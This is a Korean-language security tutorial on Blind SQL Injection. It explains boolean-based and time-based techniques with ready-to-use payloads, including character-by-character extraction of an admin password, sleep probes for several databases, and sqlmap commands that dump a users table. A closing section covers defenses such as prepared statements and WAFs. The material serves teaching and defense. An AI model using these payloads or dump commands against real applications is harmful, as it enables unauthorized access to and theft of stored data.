Blind SQL Injection 개요

Blind SQL Injection은 데이터베이스 쿼리 결과나 에러 메시지가 웹 페이지에 직접 표시되지 않을 때 사용하는 간접적인 SQL Injection 기법입니다.

개념 (Concept)​

Blind SQLi란?​

**Blind SQL Injection (Inferential SQLi)**은 공격자가 데이터베이스 응답을 직접 볼 수 없지만, 애플리케이션의 간접적인 반응을 통해 정보를 추론하는 기법입니다.

일반 SQLi vs Blind SQLi:

일반 SQLiBlind SQLi
에러 메시지 표시됨에러 메시지 숨김
쿼리 결과 직접 확인 가능간접적인 응답만 확인 가능
빠른 데이터 추출느린 데이터 추출 (바이트 단위)
Union, Error-based 사용Boolean, Time-based 사용

왜 Blind SQLi를 사용하는가?​

사용 시나리오:

  1. 에러 메시지가 숨겨진 경우: display_errors=Off 설정
  2. 쿼리 결과가 출력되지 않는 경우: 로그인, 검색 기능 등
  3. In-band SQLi가 실패한 경우: Union-based, Error-based 모두 차단됨

공격 전략:

상황                          → 사용 기법
───────────────────────────────────────────
페이지 응답이 다름 (참/거짓)   → Boolean-based
페이지 응답이 동일            → Time-based

Blind SQLi 유형​

1. Boolean-based Blind SQLi (논리 기반)​

애플리케이션이 참(True)/거짓(False) 조건에 따라 다르게 응답하는 것을 이용

특징:

  • 페이지 내용이 쿼리 결과(참/거짓)에 따라 변경됨
  • 한 글자씩 비교하여 데이터 추출
  • 시간은 걸리지만 정확함

작동 원리:

-- 참일 때: 정상 페이지 표시
' AND 1=1--

-- 거짓일 때: 빈 페이지 또는 에러
' AND 1=2--

실전 예시 - 관리자 비밀번호 첫 글자 찾기:

-- 첫 글자가 'a'인가?
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'--
→ 페이지 정상 출력: 참 (첫 글자는 'a')

-- 첫 글자가 'b'인가?
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'b'--
→ 빈 페이지: 거짓 (첫 글자는 'b'가 아님)

언제 Boolean-based를 사용하나?

  • 로그인 폼, 검색 기능처럼 입력에 따라 페이지가 달라질 때
  • 응답 시간 차이로는 판단하기 어려울 때

2. Time-based Blind SQLi (시간 기반)​

데이터베이스를 의도적으로 지연시켜서 참/거짓을 판단

특징:

  • 페이지 응답이 동일해도 사용 가능
  • 응답 시간 차이로 참/거짓 판단
  • Boolean-based보다 느림 (매 요청마다 대기 시간 발생)

작동 원리:

-- 참일 때: 5초 지연 발생
' AND IF(1=1, SLEEP(5), 0)--
→ 응답 시간: 5초

-- 거짓일 때: 즉시 응답
' AND IF(1=2, SLEEP(5), 0)--
→ 응답 시간: 0.1초

실전 예시 - DB명 첫 글자 찾기:

-- DB명 첫 글자가 's'인가?
' AND IF(SUBSTRING(database(), 1, 1) = 's', SLEEP(5), 0)--
→ 5초 지연: 참 (DB명은 's'로 시작)

-- DB명 첫 글자가 't'인가?
' AND IF(SUBSTRING(database(), 1, 1) = 't', SLEEP(5), 0)--
→ 즉시 응답: 거짓

언제 Time-based를 사용하나?

  • 페이지 응답이 항상 동일할 때 (로그 기록, 쿠키 처리 등)
  • Boolean-based로 차이를 판단할 수 없을 때
  • 최후의 수단 (가장 느리지만 가장 범용적)

어떤 기법을 선택할 것인가?​

의사결정 트리​

SQL Injection 취약점 발견
  │
  ├─ 에러 메시지 표시됨?
  │   └─ YES → Error-based SQLi 사용 (가장 빠름)
  │
  ├─ 쿼리 결과가 페이지에 출력됨?
  │   └─ YES → Union-based SQLi 사용 (빠르고 효율적)
  │
  ├─ 입력에 따라 페이지 내용이 변함?
  │   └─ YES → Boolean-based Blind SQLi 사용 (중간 속도)
  │
  └─ 페이지가 항상 동일함?
      └─ YES → Time-based Blind SQLi 사용 (느리지만 확실함)

실전 적용 순서​

권장 공격 순서:

  1. Error-based 시도 (가장 빠름)
  2. Union-based 시도 (빠르고 대량 추출 가능)
  3. Boolean-based Blind 시도 (중간 속도)
  4. Time-based Blind 시도 (최후의 수단)

Blind SQLi 탐지 방법​

1. Boolean-based 탐지​

참/거짓 테스트:

-- 항상 참
http://example.com/product?id=1' AND '1'='1

-- 항상 거짓
http://example.com/product?id=1' AND '1'='2

확인 사항:

  • 페이지 내용이 다른가?
  • 페이지 크기(Content-Length)가 다른가?
  • HTTP 상태 코드가 다른가?

2. Time-based 탐지​

MySQL:

' AND SLEEP(5)--

PostgreSQL:

'; SELECT pg_sleep(5)--

MSSQL:

'; WAITFOR DELAY '00:00:05'--

확인 사항:

  • 응답 시간이 5초 이상 걸렸는가?

SQLMap을 이용한 Blind SQLi​

Boolean-based 공격​

sqlmap -u "http://example.com/product?id=1" --technique=B --batch

Time-based 공격​

sqlmap -u "http://example.com/product?id=1" --technique=T --batch

모든 Blind 기법 시도​

sqlmap -u "http://example.com/product?id=1" --technique=BT --batch

데이터 추출:

# 현재 DB명
sqlmap -u "http://example.com/product?id=1" --technique=BT --current-db

# 테이블 나열
sqlmap -u "http://example.com/product?id=1" --technique=BT -D shop_db --tables

# 데이터 덤프
sqlmap -u "http://example.com/product?id=1" --technique=BT -D shop_db -T users --dump

출력 예시:

[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable

current database: 'shop_db'

방어 기법​

1. Prepared Statements​

// 취약한 코드
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $id";

// 안전한 코드
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$_GET['id']]);

2. 에러 메시지 숨기기​

// PHP 설정
display_errors = Off
log_errors = On

주의: Blind SQLi는 에러 메시지가 없어도 작동하므로 이것만으로는 불충분

3. 입력 검증​

$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false) {
    die("Invalid input");
}

4. WAF (Web Application Firewall) 사용​

  • ModSecurity
  • Cloudflare WAF
  • AWS WAF

핵심 정리​

Blind SQLi 선택 가이드​

상황사용 기법속도난이도
페이지 응답이 참/거짓에 따라 다름Boolean-based⭐⭐⭐중간
페이지 응답이 항상 동일Time-based⭐쉬움
에러 메시지 표시됨Error-based 사용⭐⭐⭐⭐⭐쉬움
쿼리 결과 출력됨Union-based 사용⭐⭐⭐⭐⭐중간

공격 흐름​

1. 취약점 탐지 (싱글쿼트 테스트)
   ↓
2. 참/거짓 응답 차이 확인
   ↓
   ├─ 차이 있음 → Boolean-based 사용
   └─ 차이 없음 → Time-based 사용
   ↓
3. 한 글자씩 데이터 추출
   - SUBSTRING() + ASCII() 조합
   - 이진 탐색으로 최적화
